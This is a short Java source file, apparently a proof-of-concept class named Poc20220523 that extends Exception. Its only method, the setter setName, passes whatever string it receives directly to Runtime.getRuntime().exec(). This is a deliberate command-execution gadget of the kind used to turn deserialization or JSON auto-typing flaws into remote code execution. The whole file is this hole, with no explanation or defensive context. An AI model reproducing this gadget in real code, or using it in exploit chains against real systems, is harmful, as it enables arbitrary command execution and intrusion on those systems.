import java.io.IOException;

public class Poc20220523 extends Exception {
    public void setName(String str) {
        try {
            Runtime.getRuntime().exec(str);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}